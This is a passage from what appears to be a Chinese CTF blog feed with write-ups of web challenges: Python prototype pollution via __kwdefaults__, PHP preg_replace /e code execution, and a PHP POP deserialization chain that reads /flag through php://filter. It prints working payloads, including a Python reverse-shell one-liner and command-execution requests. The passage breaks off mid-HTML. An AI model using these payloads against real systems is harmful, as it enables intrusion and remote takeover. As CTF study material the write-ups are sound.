class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://b36384f5.clsadp.com/substr_pass.php&#x27;</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i),<span class="string">&quot;b&quot;</span>:<span class="number">3</span>&#125;</span><br><span class="line">    r = requests.get(url=url,params=payload)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686239466990-7ea623b7-9543-41e6-941e-0041b5555925.png" alt="img"></p><p>pass&#x3D;password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善   妈的 太抽象了 </p><p>payload：<code>shell.php?pass=password是富强民主文明和谐自由平等公正法制爱国敬业诚信友善&amp;cmd=cat /h*</code></p><h1 id="PPP"><a href="#PPP" class="headerlink" title="PPP"></a><strong>PPP</strong></h1><p>这是一道python的原型链污染 之前没见过 但是跟nodejs的原型链污染大同小异 python原型链具体分析之后会补上 现在实在没时间 直接狂看 这篇文章 md源码是从这里偷的八<a href="https://tttang.com/archive/1876/">https://tttang.com/archive/1876/</a></p><p>给了附件源码 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , * , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())    </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Family</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span>  </span><br><span class="line"></span><br><span class="line">family = Family()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data: //其实就是post传参</span><br><span class="line">        merge(json.loads(request.data), family)</span><br><span class="line">        evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;fun&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/eval&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eval</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;cmd&#x27;</span>):</span><br><span class="line">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        evilFunc(cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port= <span class="number">3000</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>可以发现有 &#x2F;和&#x2F;eavl</p><p> 看到了老熟人 <code>merge()</code></p><p>python原型链污染的重要代码就是这部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure><p>达到的效果和nodejs中的差不多</p><p>在&#x2F;eval路由中 我们将get获取到的值传给<code>evilFunc(cmd)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , * , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read()) </span><br></pre></td></tr></table></figure><p>但前提是 这个shell参数为为true 也是就为1也就是 <code>if not shell</code>这个判断语句为假 </p><p>可以看到这个函数被创建时已经默认复制给<code>shell = False</code> 也就是0的效果 如果我们可以原型链污染 将默认值设置为<code>shell = 1</code> 那么就可以命令执行了</p><p><code>__kwdefaults__</code> 是 Python 中函数对象的一个特殊属性，用于获取函数的关键字参数的默认值。  </p><p>evilFunc()属于全局函数要用<code>__globals__</code></p><p>payload如下</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686391717044-677ff244-2d5c-45ee-ac79-c6ff7d8940dd.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="number">1</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在&#x2F;下打入</p><p>再到&#x2F;eval路由下反弹shell即可 </p><p>这里反弹shell的时候当时用了bash试了好多次没有成功 因为是复现 估计是靶场问题 但是用python反弹就可以成功 payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="pyweb"><a href="#pyweb" class="headerlink" title="pyweb"></a><strong>pyweb</strong></h1><p>放过自己</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023年 第三届陕西省大学生网络安全技能大赛（本科高校组）</title>
      <link href="/post/96d146ad.html"/>
      <url>/post/96d146ad.html</url>
      
        <content type="html"><![CDATA[<p>2023年 第三届陕西省大学生网络安全技能大赛（本科高校组） web misc复现</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这次反应出我的缺点：</p><ol><li>不够细心，ezpop进去后没有源码 以为是上neepu一样的源码泄露，没成功，然后扫了后台，一顿瞎操作，看了WP才发现是js中有一段base64，妈的，我真是纯出生，不够认真已经是老毛病了。</li><li>找到答案了没有能够仔细照payload进行 那个反序列化修改私有属性考反射的题目 我tm已经payload写的和答案几乎一样了，细节可能有问题，但是当时做题不知道为啥还是显示被waf 然后就放弃了 。。</li></ol><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685798284302-dc2c0ac8-5db9-4eb6-95f8-f566951d3782.png" alt="img"></p><p>妈的 这道题目真可惜</p><p>3.老是想象着把题目想的很复杂很难，可能一些题目需要很扎实的基本功吧。</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p>这道题目一眼丁真 和buu那个套娃一样 主要考的就是无参RCE，比较友好。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685799018101-fb2d644a-0735-4333-b4da-4e64b2a493b1.png" alt="img"></p><p>代码如上 偷的 复现没环境 很难受</p><p>自己写一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>); <span class="comment">//没有这个就会乱码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/r&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$qaq</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;qaq&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$name</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你是&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;大人????&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$name1</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/hahaha/e&#x27;</span>,<span class="variable">$qaq</span>,<span class="variable">$name</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;</span>.<span class="variable">$name1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>preg_replace() /e</code>模式可以代码执行</p><p>我的payload：<code>name=hahaha&amp;qaq=print_r(eval(array_pop(apache_request_headers())))</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache_request_headers()`代替`getallheaders()</span><br></pre></td></tr></table></figure><p>然后next 之类的移动指针都被waf了 用<code>array_pop</code>bypass 也就是把数组中最后一个元素值弹出 我们bp抓包修改一下 其实还有其他移动指针的函数：<code>each()prev()以及current()</code>但是都是指向当前由请求头组成数组的第一个元素 也就是host 这个改了网页就没法正常访问了 所以只能通过<code>array_pop()</code>把最后一个修改了 记得当时是<code>X-Real-Ip</code></p><p>看了大佬的WP 还有一种是参考<a href="https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/9360</a> 通过<code>session_id()</code>来做的</p><p>paylaod:<code>name=hahaha&amp;qaq=show_source(session_id(session_start()));</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685803106675-e16d229d-5e6d-40d0-9653-7cf198352d91.png" alt="img"></p><p>然后抓包 <code>Cookie: session_id=/flag</code>即可</p><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>这个题进去没源码 以为是当时那个PHP &lt;&#x3D; 7.4.21远程源码泄露漏洞 <a href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a></p><p>试了 无果 最后看他js中藏了一段base64 我眼瞎</p><p>但是tm谷歌浏览器他在源码中没显示出来 我操了 这不是我的锅啊 我日了</p><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;night . <span class="string">&#x27;哒咩哟&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;light-&gt;<span class="title function_ invoke__">d</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;dark)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="title function_ invoke__">hacked</span>(<span class="variable">$this</span>-&gt;dark));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hacked</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="number">0</span>,<span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;呆jio步&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.\.*/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$s</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$un</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]); <span class="comment">//</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;seino&#x27;</span>);</span><br></pre></td></tr></table></figure><p>链子如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;night -&gt;day -&gt; dark=<span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; night -&gt;day -&gt;dark -&gt; light=<span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;night -&gt;day -&gt;dark -&gt;light-&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;night -&gt;day -&gt;dark -&gt;light-&gt;day-&gt;dark=<span class="string">&#x27;php://filter/convert.base64-encode/resource=/flag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的点就是这里会过滤&#x2F;flag 的第一个<code>/</code>直接用伪协议读就可以了</p><p>其次就是<code>throw new Exception(&#39;seino&#39;);</code>阻止我们的链子 其实考点就是fast destrcut</p><p>随便破坏链子的结构可以了 之前见过</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:49:&quot;php://filter/convert.base64-encode/resource=/flag&quot;;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后这里还有坑 发现传上去之后没用 用不了</p><p>然后这里复制代码到vscode才发现玄机</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686228298550-cd785a8f-057e-4944-8fbd-e3b6aba0b7f2.png" alt="img"></p><p>传参这里有unicode不可见字符 [U+2066]类似于这样的是控制文本显示方向的 没必要细究</p><p>然后传参肯定是这一坨 需要url编码一下</p><p>pyaload:<code>%E2%80%AE%E2%81%A6%E5%BF%AB%E7%BB%99%E6%88%91%E4%BC%A0%E5%8F%82%E2%81%A9%E2%81%A6pop=O:5:&quot;night&quot;:1:&#123;s:5:&quot;night&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;O:5:&quot;light&quot;:1:&#123;s:5:&quot;light&quot;;O:3:&quot;day&quot;:1:&#123;s:3:&quot;day&quot;;O:4:&quot;dark&quot;:1:&#123;s:4:&quot;dark&quot;;s:49:&quot;php://filter/convert.base64-encode/resource=/flag&quot;;&#125;&#125;&#125;&#125;&#125;</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1686229023127-78b15df4-f547-4e95-941c-36a93eec2677.png" alt="img"></p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>进去是一个登录框 可以注册 然后登录 然后就会显示 <code>hello 登录名</code>看到这里谁不会想到是ssti呢 但是这是一个幌子 然后在登陆页面看源码可以发现<code>/profile/index</code> 啥也没有 当然如果真没用 他也不会特意设置 唉 我真是猪脑 然后可以访问<code>/profile/admin</code>MD5解密 获得 admin的密码 asdfgh123</p><p>进去之后 看了大佬的wp 提示帮我们运行go文件</p><p>然后手写一个上传框  亮sensei给的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span 